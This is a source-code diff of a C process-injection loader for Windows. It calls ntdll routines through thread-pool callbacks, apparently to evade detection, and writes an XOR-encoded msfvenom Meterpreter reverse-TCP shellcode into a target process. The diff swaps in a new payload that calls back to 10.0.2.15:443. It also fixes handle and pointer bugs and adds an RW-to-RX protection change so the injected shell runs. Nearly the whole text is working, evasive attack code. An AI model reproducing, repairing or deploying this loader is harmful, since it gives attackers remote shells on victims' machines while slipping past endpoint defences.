@@ -25,7 +25,7 @@ typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID
 
 typedef struct _NTOPENPROCESSMEMORY_ARGS {
     UINT_PTR pNtOpenProcess;   // pointer to NtOpenProcess - rax
-    HANDLE hProcess;           // HANDLE ProcessHandle - rcx
+    PHANDLE hProcess;           // HANDLE ProcessHandle - rcx
     ACCESS_MASK AccessMask;    // Access mask - rdx
     POBJECT_ATTRIBUTES oa;     // POBJECT_ATTRIBUTES r8
     PCLIENT_ID cid;            // PCLIENT_ID r9
@@ -49,6 +49,15 @@ typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
     PULONG NumberOfBytesWritten;         // PULONG NumberOfBytesWritten  - stack
 } NTWRITEVIRTUALMEMORY_ARGS, * PNTWRITEVIRTUALMEMORY_ARGS;
 
+typedef struct _NTPROTECTVIRTUALMEMORY_ARGS {
+    UINT_PTR pNtProtectVirtualMemory;          // pointer to NtCreateThreadEx - rax
+    HANDLE hProcess;                     // HANDLE ProcessHandle - r9
+    PVOID* address;                      // PVOID *address - stack
+    PULONG size;                        // PSIZE_T RegionSize - r9;
+    ULONG NewProtect;                   // ULONG Protect
+    PULONG OldProtect;                   // ULONG Protect
+} NTPROTECTVIRTUALMEMORY_ARGS, * PNTPROTECTVIRTUALMEMORY_ARGS;
+
 typedef struct _NTCREATETHREADEX_ARGS {
     UINT_PTR pNtCreateThreadEx;          // pointer to NtCreateThreadEx - rax
     HANDLE hThread;                     // HANDLE ProcessHandle - rcx
@@ -64,16 +73,18 @@ extern VOID CALLBACK WorkCallback4(PTP_CALLBACK_INSTANCE Instance, PVOID Context
 
 
 typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
-typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
 typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
+typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
 typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
 typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(HANDLE ProcessHandle, BOOL Alertable, PLARGE_INTEGER Timeout);
 
 
-// XOR-encoded payload.
-// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=443 EXITFUNC=thread -f csharp
-unsigned char buf[] = "\x06\xb2\x79\x1e\x0a\x12\x36\xfa\xfa\xfa\xbb\xab\xbb\xaa\xa8\xab\xac\xb2\xcb\x28\x9f\xb2\x71\xa8\x9a\xb2\x71\xa8\xe2\xb2\x71\xa8\xda\xb2\xf5\x4d\xb0\xb0\xb7\xcb\x33\xb2\x71\x88\xaa\xb2\xcb\x3a\x56\xc6\x9b\x86\xf8\xd6\xda\xbb\x3b\x33\xf7\xbb\xfb\x3b\x18\x17\xa8\xb2\x71\xa8\xda\x71\xb8\xc6\xbb\xab\xb2\xfb\x2a\x9c\x7b\x82\xe2\xf1\xf8\xf5\x7f\x88\xfa\xfa\xfa\x71\x7a\x72\xfa\xfa\xfa\xb2\x7f\x3a\x8e\x9d\xb2\xfb\x2a\xbe\x71\xba\xda\xb3\xfb\x2a\xaa\x71\xb2\xe2\x19\xac\xb7\xcb\x33\xb2\x05\x33\xbb\x71\xce\x72\xb2\xfb\x2c\xb2\xcb\x3a\x56\xbb\x3b\x33\xf7\xbb\xfb\x3b\xc2\x1a\x8f\x0b\xb6\xf9\xb6\xde\xf2\xbf\xc3\x2b\x8f\x22\xa2\xbe\x71\xba\xde\xb3\xfb\x2a\x9c\xbb\x71\xf6\xb2\xbe\x71\xba\xe6\xb3\xfb\x2a\xbb\x71\xfe\x72\xb2\xfb\x2a\xbb\xa2\xbb\xa2\xa4\xa3\xa0\xbb\xa2\xbb\xa3\xbb\xa0\xb2\x79\x16\xda\xbb\xa8\x05\x1a\xa2\xbb\xa3\xa0\xb2\x71\xe8\x13\xb1\x05\x05\x05\xa7\xb3\x44\x8d\x89\xc8\xa5\xc9\xc8\xfa\xfa\xbb\xac\xb3\x73\x1c\xb2\x7b\x16\x5a\xfb\xfa\xfa\xb3\x73\x1f\xb3\x46\xf8\xfa\xfb\x41\xf0\xfa\xf8\xfe\xbb\xae\xb3\x73\x1e\xb6\x73\x0b\xbb\x40\xb6\x8d\xdc\xfd\x05\x2f\xb6\x73\x10\x92\xfb\xfb\xfa\xfa\xa3\xbb\x40\xd3\x7a\x91\xfa\x05\x2f\x90\xf0\xbb\xa4\xaa\xaa\xb7\xcb\x33\xb7\xcb\x3a\xb2\x05\x3a\xb2\x73\x38\xb2\x05\x3a\xb2\x73\x3b\xbb\x40\x10\xf5\x25\x1a\x05\x2f\xb2\x73\x3d\x90\xea\xbb\xa2\xb6\x73\x18\xb2\x73\x03\xbb\x40\x63\x5f\x8e\x9b\x05\x2f\x7f\x3a\x8e\xf0\xb3\x05\x34\x8f\x1f\x12\x69\xfa\xfa\xfa\xb2\x79\x16\xea\xb2\x73\x18\xb7\xcb\x33\x90\xfe\xbb\xa2\xb2\x73\x03\xbb\x40\xf8\x23\x32\xa5\x05\x2f\x79\x02\xfa\x84\xaf\xb2\x79\x3e\xda\xa4\x73\x0c\x90\xba\xbb\xa3\x92\xfa\xea\xfa\xfa\xbb\xa2\xb2\x73\x08\xb2\xcb\x33\xbb\x40\xa2\x5e\xa9\x1f\x05\x2f\xb2\x73\x39\xb3\x73\x3d\xb7\xcb\x33\xb3\x73\x0a\xb2\x73\x20\xb2\x73\x03\xbb\x40\xf8\x23\x32\xa5\x05\x2f\x79\x02\xfa\x87\xd2\xa2\xbb\xad\xa3\x92\xfa\xba\xfa\xfa\xbb\xa2\x90\xfa\xa0\xbb\x40\xf1\xd5\xf5\xca\x05\x2f\xad\xa3\xbb\x40\x8f\x94\xb7\x9b\x05\x2f\xb3\x05\x34\x13\xc6\x05\x05\x05\xb2\xfb\x39\xb2\xd3\x3c\xb2\x7f\x0c\x8f\x4e\xbb\x05\x1d\xa2\x90\xfa\xa3\x41\x1a\xe7\xd0\xf0\xbb\x73\x20\x05\x2f";
 
+
+// XOR-encoded payload.
+// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread -f c
+unsigned char buf[] = "\x36\x82\x49\x2e\x3a\x22\x06\xca\xca\xca\x8b\x9b\x8b\x9a\x98\x82\xfb\x18\x9b\x9c\xaf\x82\x41\x98\xaa\x82\x41\x98\xd2\x82\x41\x98\xea\x82\x41\xb8\x9a\x87\xfb\x03\x82\xc5\x7d\x80\x80\x82\xfb\x0a\x66\xf6\xab\xb6\xc8\xe6\xea\x8b\x0b\x03\xc7\x8b\xcb\x0b\x28\x27\x98\x82\x41\x98\xea\x41\x88\xf6\x8b\x9b\x82\xcb\x1a\xac\x4b\xb2\xd2\xc1\xc8\xc5\x4f\xb8\xca\xca\xca\x41\x4a\x42\xca\xca\xca\x82\x4f\x0a\xbe\xad\x82\xcb\x1a\x9a\x8e\x41\x8a\xea\x83\xcb\x1a\x41\x82\xd2\x29\x9c\x82\x35\x03\x87\xfb\x03\x8b\x41\xfe\x42\x82\xcb\x1c\x82\xfb\x0a\x8b\x0b\x03\xc7\x66\x8b\xcb\x0b\xf2\x2a\xbf\x3b\x86\xc9\x86\xee\xc2\x8f\xf3\x1b\xbf\x12\x92\x8e\x41\x8a\xee\x83\xcb\x1a\xac\x8b\x41\xc6\x82\x8e\x41\x8a\xd6\x83\xcb\x1a\x8b\x41\xce\x42\x82\xcb\x1a\x8b\x92\x8b\x92\x94\x93\x90\x8b\x92\x8b\x93\x8b\x90\x82\x49\x26\xea\x8b\x98\x35\x2a\x92\x8b\x93\x90\x82\x41\xd8\x23\x81\x35\x35\x35\x97\x82\xfb\x11\x99\x83\x74\xbd\xa3\xa4\xa3\xa4\xaf\xbe\xca\x8b\x9c\x82\x43\x2b\x83\x0d\x08\x86\xbd\xec\xcd\x35\x1f\x99\x99\x82\x43\x2b\x99\x90\x87\xfb\x0a\x87\xfb\x03\x99\x99\x83\x70\xf0\x9c\xb3\x6d\xca\xca\xca\xca\x35\x1f\x22\xc0\xca\xca\xca\xfb\xfa\xe4\xfa\xe4\xf8\xe4\xfb\xff\xca\x90\x82\x43\x0b\x83\x0d\x0a\x71\xcb\xca\xca\x87\xfb\x03\x99\x99\xa0\xc9\x99\x83\x70\x9d\x43\x55\x0c\xca\xca\xca\xca\x35\x1f\x22\x88\xca\xca\xca\xe5\xa3\xa4\xae\xaf\xb2\xe4\xa2\xbe\xa7\xa6\xe5\xa0\x8b\x9a\xbf\x9a\x87\x84\x85\xbe\x9a\x80\x9c\x9e\xa6\x98\x87\x87\xfc\xad\xbb\x9d\xad\xa1\xad\xae\x90\xa5\x9a\x8d\xb0\xa9\xac\x8b\x9d\x9e\xfc\xba\xf9\x88\xb3\xa3\xf3\xac\xf9\xa3\xa3\x88\x87\xa7\x88\x99\xbf\xa0\xca\x82\x43\x0b\x99\x90\x8b\x92\x87\xfb\x03\x99\x82\x72\xca\xf8\x62\x4e\xca\xca\xca\xca\x9a\x99\x99\x83\x0d\x08\x21\x9f\xe4\xf1\x35\x1f\x82\x43\x0c\xa0\xc0\x95\x82\x43\x3b\xa0\xd5\x90\x98\xa2\x4a\xf9\xca\xca\x83\x43\x2a\xa0\xce\x8b\x93\x83\x70\xbf\x8c\x54\x4c\xca\xca\xca\xca\x35\x1f\x87\xfb\x0a\x99\x90\x82\x43\x3b\x87\xfb\x03\x87\xfb\x03\x99\x99\x83\x0d\x08\xe7\xcc\xd2\xb1\x35\x1f\x4f\x0a\xbf\xd5\x82\x0d\x0b\x42\xd9\xca\xca\x83\x70\x8e\x3a\xff\x2a\xca\xca\xca\xca\x35\x1f\x82\x35\x05\xbe\xc8\x21\x60\x22\x9f\xca\xca\xca\x99\x93\xa0\x8a\x90\x83\x43\x1b\x0b\x28\xda\x83\x0d\x0a\xca\xda\xca\xca\x83\x70\x92\x6e\x99\x2f\xca\xca\xca\xca\x35\x1f\x82\x59\x99\x99\x82\x43\x2d\x82\x43\x3b\x82\x43\x10\x83\x0d\x0a\xca\xea\xca\xca\x83\x43\x33\x83\x70\xd8\x5c\x43\x28\xca\xca\xca\xca\x35\x1f\x82\x49\x0e\xea\x4f\x0a\xbe\x78\xac\x41\xcd\x82\xcb\x09\x4f\x0a\xbf\x18\x92\x09\x92\xa0\xca\x93\x71\x2a\xd7\xe0\xc0\x8b\x43\x10\x35\x1f";
 
 
 int main(int argc, char* argv[]) {
@@ -90,7 +101,7 @@ int main(int argc, char* argv[]) {
     printf("Initialize cid\n");
     cid.UniqueProcess = (PVOID)pid;
     cid.UniqueThread = 0;
-    size_t bufSize = sizeof(buf);
+    ULONG bufSize = sizeof(buf);
 
     // loading ntdll.dll
     HMODULE hModuleNtdll = GetModuleHandleA("ntdll");
@@ -98,6 +109,7 @@ int main(int argc, char* argv[]) {
     pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)(GetProcAddress(hModuleNtdll, "NtAllocateVirtualMemory"));
     pNtWriteVirtualMemory myNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hModuleNtdll, "NtWriteVirtualMemory");
     pNtCreateThreadEx myNtCreateThreadEx = (pNtCreateThreadEx)(GetProcAddress(hModuleNtdll, "NtCreateThreadEx"));
+    pNtProtectVirtualMemory myNtProtectVirtualMemory = (pNtProtectVirtualMemory)(GetProcAddress(hModuleNtdll, "NtProtectVirtualMemory"));
     pNtWaitForSingleObject myNtWaitForSingleObject = (pNtWaitForSingleObject)(GetProcAddress(hModuleNtdll, "NtWaitForSingleObject"));
     FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
     FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
@@ -110,9 +122,10 @@ int main(int argc, char* argv[]) {
 
     printf("Opening handle\n");
     // Open handle to the target process
-    //myNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    //myNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid); 
     NTOPENPROCESSMEMORY_ARGS ntOpenProcessArgs = { 0 };
-    ntOpenProcessArgs.hProcess = NULL;
+    ntOpenProcessArgs.pNtOpenProcess = (UINT_PTR)myNtOpenProcess;
+    ntOpenProcessArgs.hProcess = &hProcess;
     ntOpenProcessArgs.AccessMask = PROCESS_ALL_ACCESS;
     ntOpenProcessArgs.oa = &oa;
     ntOpenProcessArgs.cid = &cid;
@@ -120,8 +133,7 @@ int main(int argc, char* argv[]) {
     ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback1, &ntOpenProcessArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
-    WaitForSingleObject(ntOpenProcessArgs.hProcess, 0x100);
-    hProcess = ntOpenProcessArgs.hProcess;
+    WaitForSingleObject((HANDLE)-1, 0x1000);
     printf("hProcess: %p\n", hProcess);
 
 
@@ -134,12 +146,12 @@ int main(int argc, char* argv[]) {
     ntAllocateVirtualMemoryArgs.hProcess = hProcess;
     ntAllocateVirtualMemoryArgs.address = &bufAdd;
     ntAllocateVirtualMemoryArgs.size = &bufSize;
-    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
+    ntAllocateVirtualMemoryArgs.permissions = (ULONG)PAGE_READWRITE;
     WorkReturn = NULL;
     ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback2, &ntAllocateVirtualMemoryArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
-    WaitForSingleObject(ntAllocateVirtualMemoryArgs.hProcess, 0x100);
+    WaitForSingleObject((HANDLE)-1, 0x1000);
     printf("Base address: %p\n", bufAdd);
     printf("Size: %zu\n", bufSize);
 
@@ -147,7 +159,7 @@ int main(int argc, char* argv[]) {
     // XOR the buffer with 0xfa
     // sizeof(buf) - 1; // Exclude the null terminator
     for (size_t i = 0; i < sizeof(buf) - 1; i++) {
-        buf[i] ^= 0xfa;
+        buf[i] ^= 0xca;
     }
 
 
@@ -157,33 +169,51 @@ int main(int argc, char* argv[]) {
     NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
     ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR)myNtWriteVirtualMemory;
     ntWriteVirtualMemoryArgs.hProcess = hProcess;
-    ntWriteVirtualMemoryArgs.address = &bufAdd;
-    ntWriteVirtualMemoryArgs.buffer = &buf;
+    ntWriteVirtualMemoryArgs.address = bufAdd;
+    ntWriteVirtualMemoryArgs.buffer = (PVOID)buf;
     ntWriteVirtualMemoryArgs.NumberOfBytesToWrite = sizeof(buf);
     ntWriteVirtualMemoryArgs.NumberOfBytesWritten = &bytesWritten;
     WorkReturn = NULL;
     ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback3, &ntWriteVirtualMemoryArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
-    WaitForSingleObject(ntWriteVirtualMemoryArgs.hProcess, 0x100);
+    WaitForSingleObject((HANDLE)-1, 0x1000);
     printf("Bytes written: %d\n", bytesWritten);
 
+
+    //VirtualProtect - we can use WorkCallback3
+    ULONG OldProtect = NULL;
+    printf("Changing memory protection\n");
+    //myNtProtectVirtualMemory(hProcess, &bufAdd, &bufSize, (ULONG)PAGE_EXECUTE_READ, &OldProtect);
+    NTPROTECTVIRTUALMEMORY_ARGS ntProtectVirtualMemoryArgs = { 0 };
+    ntProtectVirtualMemoryArgs.pNtProtectVirtualMemory = (UINT_PTR)myNtProtectVirtualMemory;
+    ntProtectVirtualMemoryArgs.hProcess = hProcess;
+    ntProtectVirtualMemoryArgs.address = &bufAdd;
+    ntProtectVirtualMemoryArgs.size = &bufSize;
+    ntProtectVirtualMemoryArgs.NewProtect = (ULONG)PAGE_EXECUTE_READ;
+    ntProtectVirtualMemoryArgs.OldProtect = &OldProtect;
+    WorkReturn = NULL;
+    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback3, &ntProtectVirtualMemoryArgs, NULL);
+    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
+    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
+    WaitForSingleObject((HANDLE)-1, 0x1000);
+    printf("Protection changed from: %lu\n", OldProtect);
 
 
     printf("Creating thread\n");
     // Create a thread
     //hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bufAdd, NULL, 0, NULL);
-    myNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)bufAdd, NULL, FALSE, 0, 0, 0, NULL);
+    //myNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)bufAdd, NULL, FALSE, 0, 0, 0, NULL);
     NTCREATETHREADEX_ARGS ntCreateThreadExArgs = { 0 };
     ntCreateThreadExArgs.pNtCreateThreadEx = (UINT_PTR)myNtCreateThreadEx;
-    ntCreateThreadExArgs.hThread = NULL;
+    ntCreateThreadExArgs.hThread = &hThread;
     ntCreateThreadExArgs.hProcess = hProcess;
-    ntCreateThreadExArgs.address = &bufAdd;
+    ntCreateThreadExArgs.address = (LPTHREAD_START_ROUTINE)bufAdd;
     WorkReturn = NULL;
     ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback4, &ntCreateThreadExArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
-    WaitForSingleObject(ntCreateThreadExArgs.hProcess, 0x100);
+    WaitForSingleObject(ntCreateThreadExArgs.hProcess, 0x1000);
     hThread = ntCreateThreadExArgs.hThread;
     printf("hThread: %p\n", hThread);
 
